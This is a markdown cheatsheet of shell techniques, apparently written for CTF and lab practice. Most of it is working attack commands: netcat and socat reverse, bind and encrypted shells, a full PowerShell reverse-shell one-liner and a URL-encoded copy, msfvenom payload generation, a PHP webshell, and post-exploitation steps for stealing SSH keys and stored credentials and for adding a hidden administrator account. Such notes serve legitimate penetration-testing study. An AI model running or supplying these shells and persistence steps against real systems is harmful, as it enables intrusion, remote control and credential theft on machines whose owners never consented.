#Shells #Cheatsheet  
## Netcat Shell Stabilisation

Only rlwrap is stable for Windows machines

### Python

1. `python[2/3] -c 'import pty;pty.spawn("/bin/bash")'` - For interactive shell.
2. `export TERM=xterm` - For term commands like clear.
3. Ctrl + Z - To background the sell which turns off the terminal echo (gives autocompletes, arrow keys and Ctrl + C).
4. `stty raw -echo; fg` - To foreground the shell

`reset` - To bring back the terminal echo so input in our own terminal will be visible

### rlwrap

`rlwrap nc -lvnp <port>`

In Linux: Ctrl + Z than `stty raw -echo; fg`

### Socat

`sudo python3 -m http.server 80` - In the attacking machine.

`wget <LOCAL-IP>/socat -O /tmp/socat` - In the netcat shell of Linux target machine.

`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe` - Or with the WebRequest system class in the netcat shell of Windows target machine

### Change tty size

For running things like text editor.

`stty -a` - In another terminal.

`stty rows <number>` and `stty cols <number>` - The number of rows and cols from the previous command

## Socat
### Reverse shells

`socat TCP-L:<port> -` - Basic reverse shell

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` - Command in windows to connect back.
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` - Command in Linux to connect back

### Bind shells

`socat TCP-L:<PORT> EXEC:"bash -li"` - on a Linux target

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes` - On a Windows target

`socat TCP:<TARGET-IP>:<TARGET-PORT>` - On the attacking machine to connect to the waiting listener

## Fully interactive reverse shell

Only works for target Linux machines

``socat TCP-L:<port> FILE:`tty`,raw,echo=0`` - On the attacking machine

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` - On the target Linux machine

### Encrypted shells

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt` - Generate a certificate

`cat shell.key shell.crt > shell.pem` - Merge the 2 files into 1 pem file

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` - To set up a reverse shell

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash` - To connect back

For bind shell:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes` - Target

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -` - Attacker

Fully interactive reverse shell:
`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0` - Attacker

`socat OPENSSL:10.13.31.71:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane` - Target

## Common shell payloads

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` - To create a bind shell listener on Linux (target)

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` - To send a netcat reverse shell (target)

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` - Powershell reverse shell

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - Other useful shells

## msfvenom

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>` - Generate a Windows x64 reverse shell

`<OS>/<arch>/<payload>` - Payload naming system (without the arch for Windows x32)
the payload part is with a _ for when it's a stageless shell and with / for when it's a staged reverse shell for example `windows/x64/meterpreter_reverse_tcp` and `windows/x64/meterpreter/reverse_tcp`

`msfvenom --list payloads` - List all payloads

## Metasploit multi/handler

`msfconsole` - Open metasploit

`use multi/handler`

`options`

`exploit -j` - Run as a job in the background, will get a reverse shell when the msfvenom file is executed

`sessions 1` - To foreground the session

## Webshells

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>` - A basic websehll, `?cmd=` after the file name

`/usr/share/webshells` - Location for webshells

`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22` - Encrypted Powershell shell

## Next steps

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
. These can be MD5 hashes or in plaintext, depending on the version.

After Obtaining a shell running as administartor:
`net user <username> <password> /add` - To create a new user

`net localgroup administrators <username> /add` - To add him to the administrators group

`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.192.63 /u:Administrator /p:'TryH4ckM3!'` - Connect to RDP in Linux #rdp
	
	
	
[Pentest Monkey reverse shell for Webshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
	
	
	
	
	
	
	
	
	
#shell
#cheatsheet